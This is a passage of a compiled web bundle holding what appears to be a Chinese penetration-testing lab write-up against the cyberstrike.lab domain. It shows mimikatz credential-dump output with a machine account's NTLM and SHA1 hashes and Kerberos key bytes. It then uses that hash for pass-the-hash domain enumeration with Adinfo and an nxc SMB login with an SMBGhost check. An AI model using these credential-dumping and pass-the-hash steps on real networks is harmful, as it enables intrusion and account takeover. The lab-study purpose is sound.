: (null)\nLogon Time        : 2025/10/31 23:28:01\nSID               : S-1-5-17\n    msv :    \n    tspkg :    \n    wdigest :    \n     * Username : (null)\n     * Domain   : (null)\n     * Password : (null)\n    kerberos :    \n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2025/10/31 23:27:51\nSID               : S-1-5-19\n    msv :    \n    tspkg :    \n    wdigest :    \n     * Username : (null)\n     * Domain   : (null)\n     * Password : (null)\n    kerberos :    \n     * Username : (null)\n     * Domain   : (null)\n     * Password : (null)\n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 51149 (00000000:0000c7cd)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/10/31 23:27:50\nSID               : S-1-5-90-0-1\n    msv :    \n     [00000003] Primary\n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * NTLM     : 305950dcf3677fc31893b65bad94999b\n     * SHA1     : 4660155d6777adda67170782a06e4c07332c7e84\n    tspkg :    \n    wdigest :    \n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * Password : (null)\n    kerberos :    \n     * Username : CSLAB$\n     * Domain   : cyberstrike.lab\n     * Password : 35 33 d5 18 22 f5 c7 26 8b 5d b9 27 38 31 ae b6 c3 db df a9 d2 75 3a 2a d4 60 0e c0 4e 26 63 9a 4a 75 66 95 a7 ce ab ce e5 03 4b 7f df 77 d4 c7 73 f5 18 7e 61 3d 90 82 d9 9e 93 e9 3f 47 65 28 65 b0 91 83 84 94 5f 2c 95 ff 0a ed 79 15 2b f7 d7 e0 d9 e4 70 25 ab 25 a2 0b 36 07 15 d6 ec 9e 6d 59 ac 27 72 5f 55 67 bc 4e 4c f7 98 14 4e 9a 6b 3d 92 4d fa d1 13 23 32 49 38 13 17 9d 67 b8 63 b9 af d6 cf 23 8d 98 d4 f6 8d dd d1 b0 64 f2 20 1f 5b 03 26 12 03 2e 2c d4 30 57 d8 fa fc 39 d7 e9 35 2a 6c fd d0 65 42 e9 e8 9b 61 ee 41 05 19 9c 58 65 cc 28 cb fd f2 9f 6d 98 11 3a 7b 77 5f ef 96 dc 73 c4 00 3a 59 97 26 84 f4 80 70 94 e5 7f 47 d7 be 58 aa 5f b0 cf 2c 26 72 6a 0c 4b d1 37 e4 82 fd b5 17 db cc 13 10 78 34 84 f1 cb \n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 23230 (00000000:00005abe)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2025/10/31 23:27:48\nSID               : \n    msv :    \n     [00000003] Primary\n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * NTLM     : 305950dcf3677fc31893b65bad94999b\n     * SHA1     : 4660155d6777adda67170782a06e4c07332c7e84\n    tspkg :    \n    wdigest :    \n    kerberos :    \n    ssp :    \n    credman :    \n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : CSLAB$\nDomain            : CYBERSTRIKE\nLogon Server      : (null)\nLogon Time        : 2025/10/31 23:27:48\nSID               : S-1-5-18\n    msv :    \n    tspkg :    \n    wdigest :    \n     * Username : CSLAB$\n     * Domain   : CYBERSTRIKE\n     * Password : (null)\n    kerberos :    \n     * Username : cslab$\n     * Domain   : CYBERSTRIKE.LAB\n     * Password : (null)\n    ssp :    \n    credman :    \n\nmimikatz # \n"})}),"\n",(0,d.jsx)(e.p,{children:"\u987a\u4fbf\u8dd1\u4e2a adinfo"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"PS D:\\_Tools> .\\Adinfo_win.exe -d cyberstrike.lab -u CSLAB$ -H 305950dcf3677fc31893b65bad94999b --dc 10.20.30.66\n\n           _____  _        __\n     /\\   |  __ \\(_)      / _|\n    /  \\  | |  | |_ _ __ | |_ ___\n   / /\\ \\ | |  | | | '_ \\|  _/ _ \\     Tools that collect information from domain\n  / ____ \\| |__| | | | | | || (_) |\n /_/    \\_\\_____/|_|_| |_|_| \\___/     v1.5 by lzz\n\n[i] Try to connect '10.20.30.66'\n[c] Auth Domain: cyberstrike.lab\n[c] Auth user: CSLAB$\n[c] Auth hash: 305950dcf3677fc31893b65bad94999b\n[c] connected successfully,try to dump domain info\n[i] DomainVersion found!\n                    [+] Windows 2019 Server operating system\n[i] Domain SID:\n                    [+] S-1-5-21-64854050-1587546430-3649469574\n[i] Domain MAQ found\n                    [+] 10\n[i] Domain Account Policy found\n                    [+] pwdHistory: 24\n                    [+] minPwdLength: 7\n                    [+] minPwdAge: 1(day)\n                    [+] maxPwdAge: 42(day)\n                    [+] lockoutThreshold: 0\n                    [+] lockoutDuration: 10(min)\n[i] Domain Controllers: 1 found\n                    [+] DC$  ==>>>   Windows Server 2022 Standard  [10.0 (20348)]  ==>>>  10.20.30.66\n[i] ADCS has not found!\n[i] Domain Exchange Server: 0 found\n[i] Domain All DNS:\n                    [+] Domain Dns 2 found,Saved in All_DNS.csv\n[i] Domain Trusts: 0 found\n[i] SPN: 29 found\n[i] Domain GPOs: 2 found\n[i] Domain Admins: 1 users found\n                    [+]Administrator\n[i] Enterprise Admins: 1 users found\n                    [+]Administrator\n[i] administrators: 1 users found\n                    [+]Administrator\n[i] Backup Operators: 0 users found\n[i] Users: 4 found\n[i] User with Mail: 0 found\n[i] Only_name_and_Useful_Users: 1 found\n[i] Only_admincount=1_andUseful_Users: 1 found\n[i] Locked Users: 0 found\n[i] Disabled Users: 3 found\n[i] Users with passwords not set to expire: 2 found\n[i] Domain Computers: 2 found\n[i] Only_name_and_Useful_computers: 2 found\n[i] Groups: 48 found\n[i] Domain OUs: 1 found\n[i] LAPS Not found\n[i] LAPS passwords: 0 found\n[i] SensitiveDelegate Users: 0 found\n[i] AsReproast Users: 0 found\n[i] Kerberoast Users: 1 found\n                    [+] CN=krbtgt,CN=Users,DC=cyberstrike,DC=lab  ==>>>  kadmin/changepw\n[i] SIDHistory Users: 0 found\n[i] CreatorSID Users: 0 found\n[i] RBCD Users: 0 found\n[i] Unconstrained Deligation Users: 0 found\n[i] Constrained Deligation Users: 0 found\n[i] Krbtgt password last set time: 2025-07-11 12:21:43 +0800 CST\n[i] CSVs written to 'csv' directory in D:\\_Tools\n[i] Execution took 2.7696917s\n"})}),"\n",(0,d.jsx)(e.h2,{id:"dc---\u5c1d\u8bd5",children:"DC - \u5c1d\u8bd5"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ proxychains nxc smb 10.20.30.66 -u CSLAB$ -H 305950dcf3677fc31893b65bad94999b -M smbghost\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nSMB         10.20.30.66     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:cyberstrike.lab) (signing:True) (SMBv1:True) \nSMB         10.20.30.66     445    DC               [+] cyberstrike.lab\\CSLAB$:305950dcf3677fc31893b65bad94999b \nSMBGHOST    10.20.30.66     445    DC               Potentially vulnerable to SMBGhost (CVE-2020-0796)\n"})}),"\n",(0,d.jsx)(e.p,{children:"TODO \u672a\u653b\u7834"})]})}function m(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,d.jsx)(e,{...n,children:(0,d.jsx)(l,{...n})}):l(n)}},29458:(n,e,a)=>{a.d(e,{A:()=>s});const s=a.p+"assets/images/image_20251030-233002-790d469e5d0be8d132122a8f5551ce38.png"},57820:(n,e,a)=>{a.d(e,{A:()=>s});const s=a.p+"assets/images/image_20251053-225308-e297b57a2a9944ab83d0c995746a8e9c.png"},35523:(n,e,a)=>{a.d(e,{A:()=>s});const s=a.p+"assets/images/image_20251054-225401-2854a84ff5abd6f86a765e2ad0b022a6.png"},63761:(n,e,a)=>{a.d(e,{A:()=>s});const s=a.p+"assets/images/image_20251136-073647-f61921bf4f025231c6a58cf69c045272.png"},36385:(n,e,a)=>{a.d(e,{A:()=>s});const s=a.p+"assets/images/image_20251144-074423-bc0b633dd9fd931b062b0f2b23eb8c85.png"},41988:(n,e,a)=>{a.d(e,{A:()=>s});const s=a.p+"assets/images/image_20251144-074448-c9fc64370547be501775fb1274065f10.png"},33987:(n,e,a)=>{a.d(e,{A:()=>s});const s=a.p+"assets/images/image_20251145-074512-f2a7287f178f68caed4a4230f0992542.png"},78361:(n,e,a)=>{a.d(e,{A:()=>s});const s=a.p+"assets/images/image_20251148-074823-ca4d26a64a206b6f92a331c2f1661f22.png"},28453:(n,e,a)=>{a.d(e,{R:()=>r,x:()=>t});var s=a(96540);const d={},i=s.createContext(d);function r(n){const e=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function t(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(d):n.components||d:r(n.components),s.createElement(i.Provider,{value:e},n.children)}}}]);